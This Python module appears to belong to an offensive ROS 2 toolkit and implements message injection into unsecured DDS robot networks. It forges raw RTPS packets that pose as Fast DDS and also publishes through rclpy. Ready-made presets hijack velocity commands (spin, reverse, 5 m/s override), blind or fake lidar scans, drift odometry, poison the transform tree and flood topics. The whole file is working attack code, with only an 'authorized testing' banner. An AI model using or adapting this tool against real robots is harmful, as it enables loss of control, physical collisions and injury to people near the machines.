#!/usr/bin/env python3
"""
topic_injection.py — ROS 2 Topic Message Injection
=====================================================
Injects crafted messages into ROS 2 topics via raw DDS/RTPS packets.

This module operates at two levels:
1. ROS 2 CLI-level injection (uses rclpy if available)
2. Raw RTPS packet-level injection (uses Scapy — works without ROS 2 installed)

Attack capabilities:
- cmd_vel injection: Override robot velocity commands
- Sensor spoofing: Inject fake LIDAR scans, odometry
- TF poisoning: Corrupt the transform tree to cause localization failure
- Topic flooding: Bandwidth exhaustion on specific topics

All attacks target unsecured DDS deployments (no DDS-Security / SROS2).

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️

Author: Gh057x
"""

import struct
import socket
import time
import math
import random
import os
import json
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

from core.rtps_parser import (
    RTPSParser, DDSParticipant, DDSPortCalculator,
    RTPS_MAGIC, VendorId, SubmessageKind,
)
from core.rtps_scanner import SPDPProbeBuilder


# =============================================================================
# Attack Types & Configuration
# =============================================================================

class AttackType(str, Enum):
    CMD_VEL_OVERRIDE = "cmd_vel_override"
    CMD_VEL_SPIN = "cmd_vel_spin"
    CMD_VEL_HALT = "cmd_vel_halt"
    CMD_VEL_REVERSE = "cmd_vel_reverse"
    LIDAR_BLIND = "lidar_blind"
    LIDAR_WALL = "lidar_wall"
    ODOM_DRIFT = "odom_drift"
    TF_POISON = "tf_poison"
    TOPIC_FLOOD = "topic_flood"


@dataclass
class AttackConfig:
    """Configuration for an injection attack"""
    attack_type: AttackType
    target_topic: str
    target_ip: Optional[str] = None
    target_port: Optional[int] = None
    domain_id: int = 0
    namespace: str = "/robot1"
    rate_hz: float = 100.0
    duration_sec: float = 10.0
    use_raw_rtps: bool = False
    # Attack-specific
    linear_x: float = 0.0
    linear_y: float = 0.0
    angular_z: float = 0.0
    scan_range_override: float = 3.5
    flood_payload_size: int = 1024

    def to_dict(self) -> Dict:
        return {
            "attack_type": self.attack_type.value,
            "target_topic": self.target_topic,
            "target_ip": self.target_ip,
            "domain_id": self.domain_id,
            "namespace": self.namespace,
            "rate_hz": self.rate_hz,
            "duration_sec": self.duration_sec,
        }


@dataclass
class AttackResult:
    """Results of an injection attack"""
    attack_type: str
    target_topic: str
    start_time: str
    end_time: str = ""
    messages_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    success: bool = False
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "attack_type": self.attack_type,
            "target_topic": self.target_topic,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "messages_sent": self.messages_sent,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "success": self.success,
            "notes": self.notes,
        }


# =============================================================================
# CDR Serialization Helpers
# =============================================================================

class CDRSerializer:
    """
    Common Data Representation (CDR) serializer for ROS 2 message types.
    Builds raw byte payloads without requiring rclpy.
    """

    @staticmethod
    def cdr_header(little_endian: bool = True) -> bytes:
        if little_endian:
            return b'\x00\x01\x00\x00'
        return b'\x00\x00\x00\x00'

    @staticmethod
    def ros2_time_now() -> Tuple[int, int]:
        now = time.time()
        sec = int(now)
        nanosec = int((now - sec) * 1e9)
        return sec, nanosec

    @staticmethod
    def serialize_string(s: str) -> bytes:
        """Serialize a CDR string (uint32 len + chars + null + padding)"""
        encoded = s.encode('utf-8') + b'\x00'
        data = struct.pack('<I', len(encoded)) + encoded
        padding = (4 - len(encoded) % 4) % 4
        return data + b'\x00' * padding

    @staticmethod
    def serialize_header(frame_id: str = "", stamp: Tuple[int, int] = None) -> bytes:
        if stamp is None:
            stamp = CDRSerializer.ros2_time_now()
        data = struct.pack('<iI', stamp[0], stamp[1])
        data += CDRSerializer.serialize_string(frame_id)
        return data

    @staticmethod
    def serialize_twist(linear_x: float = 0.0, linear_y: float = 0.0,
                        linear_z: float = 0.0, angular_x: float = 0.0,
                        angular_y: float = 0.0, angular_z: float = 0.0) -> bytes:
        """geometry_msgs/msg/Twist: 2x Vector3 = 48 bytes"""
        return struct.pack('<6d',
                           linear_x, linear_y, linear_z,
                           angular_x, angular_y, angular_z)

    @staticmethod
    def serialize_laser_scan(ranges: List[float] = None,
                              range_min: float = 0.12,
                              range_max: float = 3.5,
                              angle_min: float = -3.14159,
                              angle_max: float = 3.14159,
                              frame_id: str = "base_scan") -> bytes:
        if ranges is None:
            ranges = [range_max] * 360

        num_readings = len(ranges)
        angle_increment = (angle_max - angle_min) / max(num_readings - 1, 1)

        data = CDRSerializer.serialize_header(frame_id)
        data += struct.pack('<7f',
                            angle_min, angle_max, angle_increment,
                            0.0, 0.1, range_min, range_max)
        # ranges array
        data += struct.pack('<I', num_readings)
        data += struct.pack(f'<{num_readings}f', *ranges)
        # intensities array
        data += struct.pack('<I', num_readings)
        data += struct.pack(f'<{num_readings}f', *([100.0] * num_readings))
        return data

    @staticmethod
    def serialize_odometry(x: float = 0.0, y: float = 0.0,
                            theta: float = 0.0,
                            vx: float = 0.0, vtheta: float = 0.0) -> bytes:
        data = CDRSerializer.serialize_header("odom")
        data += CDRSerializer.serialize_string("base_link")
        # Pose: position (3xf64) + orientation (4xf64)
        data += struct.pack('<3d', x, y, 0.0)
        data += struct.pack('<4d', 0.0, 0.0,
                            math.sin(theta / 2.0), math.cos(theta / 2.0))
        data += b'\x00' * (36 * 8)  # pose covariance
        # Twist
        data += struct.pack('<3d', vx, 0.0, 0.0)
        data += struct.pack('<3d', 0.0, 0.0, vtheta)
        data += b'\x00' * (36 * 8)  # twist covariance
        return data

    @staticmethod
    def serialize_transform_stamped(parent: str, child: str,
                                      tx: float = 0.0, ty: float = 0.0,
                                      tz: float = 0.0, theta: float = 0.0) -> bytes:
        """geometry_msgs/msg/TransformStamped"""
        data = CDRSerializer.serialize_header(parent)
        data += CDRSerializer.serialize_string(child)
        # Translation
        data += struct.pack('<3d', tx, ty, tz)
        # Rotation (quaternion)
        data += struct.pack('<4d', 0.0, 0.0,
                            math.sin(theta / 2.0), math.cos(theta / 2.0))
        return data


# =============================================================================
# Raw RTPS Packet Injection Engine
# =============================================================================

class RTPSInjector:
    """
    Builds and sends raw RTPS DATA packets for topic injection.
    Works WITHOUT any ROS 2 installation — pure socket + packet crafting.
    """

    INJECTOR_GUID = bytes([
        0xCA, 0xFE, 0xBA, 0xBE,
        0x52, 0x32, 0x52, 0x50,   # "R2RP"
        0x00, 0x00, 0x00, 0x01,
    ])

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.sequence_number = 0

    def build_rtps_data_packet(self, serialized_data: bytes,
                                 writer_entity_id: bytes = None,
                                 reader_entity_id: bytes = None) -> bytes:
        if writer_entity_id is None:
            writer_entity_id = bytes([0x00, 0x00, 0x01, 0x02])
        if reader_entity_id is None:
            reader_entity_id = bytes([0x00, 0x00, 0x00, 0x00])

        info_ts = self._build_info_ts()
        data_submsg = self._build_data_submessage(
            serialized_data, writer_entity_id, reader_entity_id
        )

        packet = self._build_rtps_header()
        packet += info_ts
        packet += data_submsg
        return packet

    def _build_rtps_header(self) -> bytes:
        header = RTPS_MAGIC
        header += bytes([2, 4])
        header += struct.pack('!H', 0x010F)   # Masquerade as Fast DDS
        header += self.INJECTOR_GUID
        return header

    def _build_info_ts(self) -> bytes:
        now = time.time()
        payload = struct.pack('<I', int(now))
        payload += struct.pack('<I', int((now - int(now)) * (2**32)))

        submsg = bytes([SubmessageKind.INFO_TS, 0x01])
        submsg += struct.pack('<H', len(payload))
        submsg += payload
        return submsg

    def _build_data_submessage(self, serialized_data: bytes,
                                 writer_eid: bytes, reader_eid: bytes) -> bytes:
        self.sequence_number += 1

        data_payload = struct.pack('<H', 0x0000)          # extra flags
        data_payload += struct.pack('<H', 16)              # octets to inline QoS
        data_payload += reader_eid
        data_payload += writer_eid
        data_payload += struct.pack('<II', 0, self.sequence_number)
        data_payload += CDRSerializer.cdr_header() + serialized_data

        submsg = bytes([SubmessageKind.DATA, 0x05])
        submsg += struct.pack('<H', len(data_payload))
        submsg += data_payload
        return submsg

    def send_udp(self, packet: bytes, target_ip: str, target_port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(packet, (target_ip, target_port))
            sock.close()
            return True
        except Exception as e:
            if self.verbose:
                print(f"[!] Send error: {e}")
            return False

    def send_multicast(self, packet: bytes, domain_id: int = 0) -> bool:
        port = DDSPortCalculator.user_multicast(domain_id)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            sock.sendto(packet, ("239.255.0.1", port))
            sock.close()
            return True
        except Exception as e:
            if self.verbose:
                print(f"[!] Multicast error: {e}")
            return False


# =============================================================================
# ROS 2 Level Injector (uses rclpy when available)
# =============================================================================

class ROS2Injector:
    """
    Injects using rclpy publishers. Creates a real DDS participant
    that publishes at high rate to overpower the legitimate publisher.
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self._node = None
        self._publishers = {}

    def _ensure_node(self):
        if self._node is not None:
            return
        try:
            import rclpy
            from rclpy.node import Node
            from rclpy.qos import QoSProfile, ReliabilityPolicy
            if not rclpy.ok():
                rclpy.init()
            self._node = rclpy.create_node('ros2reaper_injector',
                                            allow_undeclared_parameters=True)
            self._rclpy = rclpy
            self._QoSProfile = QoSProfile
            self._ReliabilityPolicy = ReliabilityPolicy
        except ImportError:
            raise RuntimeError(
                "rclpy not available. Use --raw-rtps mode or install ROS 2."
            )

    def _get_pub(self, topic: str, msg_type):
        if topic not in self._publishers:
            qos = self._QoSProfile(
                depth=1,
                reliability=self._ReliabilityPolicy.BEST_EFFORT,
            )
            self._publishers[topic] = self._node.create_publisher(msg_type, topic, qos)
        return self._publishers[topic]

    def inject_twist(self, topic: str, linear_x: float = 0.0,
                      linear_y: float = 0.0, angular_z: float = 0.0,
                      rate_hz: float = 100.0, duration: float = 10.0) -> AttackResult:
        self._ensure_node()
        from geometry_msgs.msg import Twist

        pub = self._get_pub(topic, Twist)
        msg = Twist()
        msg.linear.x = linear_x
        msg.linear.y = linear_y
        msg.angular.z = angular_z

        return self._pub_loop(pub, msg, topic, rate_hz, duration, "cmd_vel_injection")

    def inject_laser_scan(self, topic: str, ranges: List[float] = None,
                           range_max: float = 3.5, rate_hz: float = 50.0,
                           duration: float = 10.0) -> AttackResult:
        self._ensure_node()
        from sensor_msgs.msg import LaserScan

        pub = self._get_pub(topic, LaserScan)
        msg = LaserScan()
        msg.header.frame_id = "base_scan"
        msg.angle_min = -3.14159
        msg.angle_max = 3.14159
        msg.angle_increment = 0.01745
        msg.range_min = 0.12
        msg.range_max = range_max
        msg.ranges = ranges if ranges else [range_max] * 360
        msg.intensities = [100.0] * len(msg.ranges)

        return self._pub_loop(pub, msg, topic, rate_hz, duration, "lidar_spoof")

    def inject_odometry(self, topic: str, x: float = 0.0, y: float = 0.0,
                         theta: float = 0.0, rate_hz: float = 50.0,
                         duration: float = 10.0, drift: bool = False) -> AttackResult:
        self._ensure_node()
        from nav_msgs.msg import Odometry

        pub = self._get_pub(topic, Odometry)
        result = AttackResult(
            attack_type="odom_spoof", target_topic=topic,
            start_time=datetime.now().isoformat(),
        )

        interval = 1.0 / rate_hz
        deadline = time.time() + duration
        drift_offset = 0.0

        while time.time() < deadline:
            msg = Odometry()
            msg.header.stamp = self._node.get_clock().now().to_msg()
            msg.header.frame_id = "odom"
            msg.child_frame_id = "base_link"

            if drift:
                drift_offset += random.gauss(0.01, 0.005)

            msg.pose.pose.position.x = x + drift_offset
            msg.pose.pose.position.y = y + (drift_offset * 0.5)
            msg.pose.pose.orientation.z = math.sin((theta + drift_offset) / 2.0)
            msg.pose.pose.orientation.w = math.cos((theta + drift_offset) / 2.0)

            pub.publish(msg)
            result.messages_sent += 1
            time.sleep(interval)

        result.end_time = datetime.now().isoformat()
        result.success = result.messages_sent > 0
        return result

    def _pub_loop(self, publisher, msg, topic: str,
                   rate_hz: float, duration: float,
                   attack_name: str) -> AttackResult:
        result = AttackResult(
            attack_type=attack_name, target_topic=topic,
            start_time=datetime.now().isoformat(),
        )

        interval = 1.0 / rate_hz
        deadline = time.time() + duration

        while time.time() < deadline:
            try:
                if hasattr(msg, 'header') and hasattr(msg.header, 'stamp'):
                    msg.header.stamp = self._node.get_clock().now().to_msg()
                publisher.publish(msg)
                result.messages_sent += 1
            except Exception as e:
                result.errors += 1
            time.sleep(interval)

        result.end_time = datetime.now().isoformat()
        result.success = result.messages_sent > 0
        return result

    def cleanup(self):
        if self._node:
            self._node.destroy_node()
            self._node = None


# =============================================================================
# Attack Presets
# =============================================================================

class AttackPresets:
    """Pre-configured attack patterns"""

    @staticmethod
    def cmd_vel_halt(namespace: str = "/robot1", duration: float = 30.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.CMD_VEL_HALT,
            target_topic=f"{namespace}/cmd_vel",
            namespace=namespace,
            linear_x=0.0, angular_z=0.0,
            rate_hz=200.0, duration_sec=duration,
        )

    @staticmethod
    def cmd_vel_spin(namespace: str = "/robot1", duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.CMD_VEL_SPIN,
            target_topic=f"{namespace}/cmd_vel",
            namespace=namespace,
            linear_x=0.0, angular_z=3.14159,
            rate_hz=200.0, duration_sec=duration,
        )

    @staticmethod
    def cmd_vel_override(namespace: str = "/robot1",
                          linear_x: float = 5.0, angular_z: float = 0.0,
                          duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.CMD_VEL_OVERRIDE,
            target_topic=f"{namespace}/cmd_vel",
            namespace=namespace,
            linear_x=linear_x, angular_z=angular_z,
            rate_hz=200.0, duration_sec=duration,
        )

    @staticmethod
    def cmd_vel_reverse(namespace: str = "/robot1", duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.CMD_VEL_REVERSE,
            target_topic=f"{namespace}/cmd_vel",
            namespace=namespace,
            linear_x=-2.0, angular_z=0.0,
            rate_hz=200.0, duration_sec=duration,
        )

    @staticmethod
    def lidar_blind(namespace: str = "/robot1", duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.LIDAR_BLIND,
            target_topic=f"{namespace}/scan",
            namespace=namespace,
            scan_range_override=3.5, rate_hz=100.0, duration_sec=duration,
        )

    @staticmethod
    def lidar_wall(namespace: str = "/robot1", duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.LIDAR_WALL,
            target_topic=f"{namespace}/scan",
            namespace=namespace,
            scan_range_override=0.15, rate_hz=100.0, duration_sec=duration,
        )

    @staticmethod
    def odom_drift(namespace: str = "/robot1", duration: float = 30.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.ODOM_DRIFT,
            target_topic=f"{namespace}/odom",
            namespace=namespace,
            rate_hz=50.0, duration_sec=duration,
        )

    @staticmethod
    def topic_flood(namespace: str = "/robot1",
                     topic: str = "cmd_vel",
                     payload_size: int = 4096,
                     duration: float = 10.0) -> AttackConfig:
        return AttackConfig(
            attack_type=AttackType.TOPIC_FLOOD,
            target_topic=f"{namespace}/{topic}",
            namespace=namespace,
            flood_payload_size=payload_size,
            rate_hz=1000.0, duration_sec=duration,
        )


# =============================================================================
# Attack Orchestrator
# =============================================================================

class TopicInjector:
    """Main attack orchestrator — coordinates injection attacks."""

    PRESET_MAP = {
        "halt": AttackPresets.cmd_vel_halt,
        "spin": AttackPresets.cmd_vel_spin,
        "override": AttackPresets.cmd_vel_override,
        "reverse": AttackPresets.cmd_vel_reverse,
        "lidar_blind": AttackPresets.lidar_blind,
        "lidar_wall": AttackPresets.lidar_wall,
        "odom_drift": AttackPresets.odom_drift,
        "flood": AttackPresets.topic_flood,
    }

    def __init__(self, namespace: str = "/robot1", domain_id: int = 0,
                 verbose: bool = False):
        self.verbose = verbose
        self.namespace = namespace
        self.domain_id = domain_id
        self._ros2_injector = None
        self._rtps_injector = RTPSInjector(verbose=verbose)
        self._attack_log: List[AttackResult] = []

    def execute(self, config: AttackConfig) -> AttackResult:
        self._log(f"Executing {config.attack_type.value} on {config.target_topic}")
        self._log(f"Rate: {config.rate_hz}Hz | Duration: {config.duration_sec}s")

        if config.use_raw_rtps:
            result = self._execute_raw(config)
        else:
            result = self._execute_ros2(config)

        self._attack_log.append(result)
        return result

    def execute_preset(self, preset_name: str, namespace: str = "/robot1",
                        **kwargs) -> AttackResult:
        if preset_name not in self.PRESET_MAP:
            raise ValueError(
                f"Unknown preset: {preset_name}. "
                f"Available: {', '.join(self.PRESET_MAP.keys())}"
            )
        config = self.PRESET_MAP[preset_name](namespace=namespace, **kwargs)
        return self.execute(config)

    def _execute_ros2(self, config: AttackConfig) -> AttackResult:
        if self._ros2_injector is None:
            self._ros2_injector = ROS2Injector(verbose=self.verbose)

        dispatch = {
            AttackType.CMD_VEL_OVERRIDE: lambda: self._ros2_injector.inject_twist(
                config.target_topic, linear_x=config.linear_x,
                angular_z=config.angular_z,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.CMD_VEL_SPIN: lambda: self._ros2_injector.inject_twist(
                config.target_topic, angular_z=3.14159,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.CMD_VEL_HALT: lambda: self._ros2_injector.inject_twist(
                config.target_topic,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.CMD_VEL_REVERSE: lambda: self._ros2_injector.inject_twist(
                config.target_topic, linear_x=-2.0,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.LIDAR_BLIND: lambda: self._ros2_injector.inject_laser_scan(
                config.target_topic, ranges=[config.scan_range_override] * 360,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.LIDAR_WALL: lambda: self._ros2_injector.inject_laser_scan(
                config.target_topic, ranges=[0.15] * 360,
                rate_hz=config.rate_hz, duration=config.duration_sec),
            AttackType.ODOM_DRIFT: lambda: self._ros2_injector.inject_odometry(
                config.target_topic, drift=True,
                rate_hz=config.rate_hz, duration=config.duration_sec),
        }

        handler = dispatch.get(config.attack_type)
        if not handler:
            return AttackResult(
                attack_type=config.attack_type.value,
                target_topic=config.target_topic,
                start_time=datetime.now().isoformat(),
                notes=[f"Type {config.attack_type.value} not implemented for rclpy"],
            )
        return handler()

    def _execute_raw(self, config: AttackConfig) -> AttackResult:
        if not config.target_ip:
            return AttackResult(
                attack_type=config.attack_type.value,
                target_topic=config.target_topic,
                start_time=datetime.now().isoformat(),
                notes=["Raw RTPS mode requires --target-ip"],
            )

        target_port = config.target_port or DDSPortCalculator.user_unicast(
            config.domain_id, 0
        )

        result = AttackResult(
            attack_type=config.attack_type.value,
            target_topic=config.target_topic,
            start_time=datetime.now().isoformat(),
        )

        interval = 1.0 / config.rate_hz
        deadline = time.time() + config.duration_sec

        self._log(f"Raw RTPS → {config.target_ip}:{target_port} "
                  f"@ {config.rate_hz}Hz for {config.duration_sec}s")

        while time.time() < deadline:
            # Build payload per attack type
            if config.attack_type in (
                AttackType.CMD_VEL_OVERRIDE, AttackType.CMD_VEL_SPIN,
                AttackType.CMD_VEL_HALT, AttackType.CMD_VEL_REVERSE,
            ):
                payload = CDRSerializer.serialize_twist(
                    linear_x=config.linear_x, angular_z=config.angular_z)
            elif config.attack_type in (AttackType.LIDAR_BLIND, AttackType.LIDAR_WALL):
                payload = CDRSerializer.serialize_laser_scan(
                    ranges=[config.scan_range_override] * 360)
            elif config.attack_type == AttackType.ODOM_DRIFT:
                drift = random.gauss(0.05, 0.02) * (result.messages_sent + 1)
                payload = CDRSerializer.serialize_odometry(
                    x=drift, y=drift * 0.5, theta=drift * 0.1)
            elif config.attack_type == AttackType.TF_POISON:
                offset = random.gauss(2.0, 0.5)
                payload = CDRSerializer.serialize_transform_stamped(
                    "odom", "base_link", tx=offset, ty=offset)
            elif config.attack_type == AttackType.TOPIC_FLOOD:
                payload = os.urandom(config.flood_payload_size)
            else:
                result.notes.append(f"Unknown type for raw: {config.attack_type}")
                break

            packet = self._rtps_injector.build_rtps_data_packet(payload)
            if self._rtps_injector.send_udp(packet, config.target_ip, target_port):
                result.messages_sent += 1
                result.bytes_sent += len(packet)
            else:
                result.errors += 1

            time.sleep(interval)

        result.end_time = datetime.now().isoformat()
        result.success = result.messages_sent > 0

        self._log(f"Done: {result.messages_sent} packets, "
                  f"{result.bytes_sent} bytes, {result.errors} errors")
        return result

    def get_attack_log(self) -> List[Dict]:
        return [r.to_dict() for r in self._attack_log]

    def cleanup(self):
        if self._ros2_injector:
            self._ros2_injector.cleanup()

    def _log(self, msg: str, level: str = "INFO"):
        if self.verbose or level in ("WARNING", "ERROR"):
            print(f"[{level}] {msg}")


# =============================================================================
# Output
# =============================================================================

def print_attack_result(result: AttackResult):
    status = "\033[92m✓ SUCCESS\033[0m" if result.success else "\033[91m✗ FAILED\033[0m"
    print(f"\n{'─' * 50}")
    print(f"  Attack: {result.attack_type}")
    print(f"  Target: {result.target_topic}")
    print(f"  Status: {status}")
    print(f"  Messages:  {result.messages_sent:,}")
    print(f"  Bytes:     {result.bytes_sent:,}")
    print(f"  Errors:    {result.errors}")
    print(f"  Duration:  {result.start_time} → {result.end_time}")
    if result.notes:
        for note in result.notes:
            print(f"    - {note}")
    print(f"{'─' * 50}\n")
